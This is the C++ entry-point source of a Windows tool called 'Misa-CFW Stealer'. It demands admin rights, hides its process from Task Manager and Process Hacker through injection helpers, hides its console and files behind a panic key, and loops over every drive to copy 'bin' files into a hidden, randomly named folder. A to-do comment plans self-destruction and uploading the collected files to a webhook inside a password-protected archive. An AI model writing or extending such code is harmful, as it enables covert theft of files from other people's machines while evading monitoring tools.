#pragma once

#include "filesystem"
#include "iostream"
#include <random>  
#include <stack>
#include <string>   
#include <vector>    
#include <windows.h>
#include <thread>    
#include <random>
#include "ShellScalingApi.h"

#include "utilities/color.h"
#include "settings.h"
#include "utilities/util.h"
#include "utilities/InjectProcess.h"

//To Do List:
//
//1. only grab newly created bins
//2. self distruct on exit
//3. upload bin(s) to webook 
//4. add to winrar file thats password protected 

auto main() -> int {

	SetConsoleCtrlHandler((PHANDLER_ROUTINE)[](DWORD ctrlType) -> BOOL {
		if (ctrlType == CTRL_CLOSE_EVENT || CTRL_SHUTDOWN_EVENT || CTRL_LOGOFF_EVENT || CTRL_BREAK_EVENT) {
			//util::rename_file("Runtime Broker.exe", "Misa-CFW-Stealer.exe");
			util::restore_attributes();
			Sleep(500);
			exit(0);
			return TRUE;
		}
		return FALSE;
		}, TRUE);

	SetConsoleTitleA("Misa-CFW Stealer");

	if (!util::check_admin()) {
		std::cout << hue::red << "[!] " << hue::grey << "Please Run As Admin!" << std::endl;
		system("pause");
		exit(0);
	}

	std::string question;
	std::cout << hue::white << "[+] " << hue::grey << "Would You Like To Restore All Hidden Files? [If You Previously Used Panic Key]" << std::endl;

	std::getline(std::cin, question);
	std::transform(question.begin(), question.end(), question.begin(), ::tolower);

	if (question == "y" || question == "Yes" || question == "Yea") {

		util::restore_attributes();
		std::cout << hue::white << "[+] " << hue::grey << "Files Restored." << hue::white << std::endl;

		system("pause");

	}
	else {
		system("cls");
	}

	if (!process::hide_from_process(L"Taskmgr.exe", false))
	{
		std::cout << hue::red << "[!] " << hue::grey << "Failed To Hide From Task Manager!" << std::endl;
	}

	if (!process::hide_from_process(L"ProcessHacker.exe", false))
	{
		std::cout << hue::red << "[!] " << hue::grey << "Failed To Hide From ProcessHacker!" << std::endl;
	}

	std::thread(process::hide_process).detach();

	std::cout << hue::yellow << "[!] " << hue::grey << "Ensure Program Is Placed In A Random Windows Folder!" << std::endl;
	Sleep(3500);
	system("cls");
	std::cout << hue::white << "[+] " << hue::grey << "Press Your Desired Panic Key.." << hue::white << std::endl;

	bool keySelected = false;
	while (!keySelected)
	{
		for (int i = 0; i <= 0xA5; i++) {
			if (GetAsyncKeyState(i) & 1) {
				if (i == 1 || i == 2 || i == 4 || i == 5 || i == 6) continue; // Skip Mouse Buttons, good quality of life shit.
				settings.panicKey = i;
				keySelected = true;
			}
		}
	}

	system("cls");
	std::cout << hue::white << "[+] " << hue::grey << "Selected Panic Key: " << hue::purple << util::get_key_name(settings.panicKey) << std::endl;
	system("pause"); system("cls");

	std::string decision;

	std::cout << hue::white << "[+] " << hue::grey << "Would You Like To Hide Misa-Stealer Console And Its Files?" << std::flush;
	std::getline(std::cin, decision);

	std::transform(decision.begin(), decision.end(), decision.begin(), ::tolower);

	if (decision == "y" || decision == "yes")
	{
		std::cout << hue::white << "[+] " << hue::grey << "To Unhide Files Please Re-Open And Answer Yes When It Asks You." << std::endl;
		system("cls");
		Sleep(2000);

		std::cout << hue::white << "[+] " << hue::grey << "Hiding Console..." << std::endl;
		Sleep(1000);
		FreeConsole();
	}
	else
	{
		std::cout << hue::white << "[+] " << hue::grey << "Program Hiding Skipped Continuing... (Not Recommended)" << std::endl;
		Sleep(500);
		system("cls");
	}

	std::thread helper_thread(util::helper);

	// Creates a folder with a random name to put the bins in.
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> distr(1000, 9999);
	path random_folder_name = std::filesystem::current_path() / (std::to_string(distr(gen)));
	std::filesystem::create_directory(random_folder_name);

	if (!process::setFileHide(random_folder_name.c_str())) {
		std::cout << hue::red << "[!] " << hue::grey << "Failed To Hide Bin Folder!" << std::endl;
	}

	for (;;) 
	{
		DWORD drives = GetLogicalDrives();
		for (int i = 0; i < 26; ++i) {
			if (drives & (1 << i)) {
				char drive_letter = 'A' + i;
				path drive = std::string(1, drive_letter) + ":\\";
				util::grab_bins(drive, random_folder_name);

			}
		}
	}

	return 0;
}


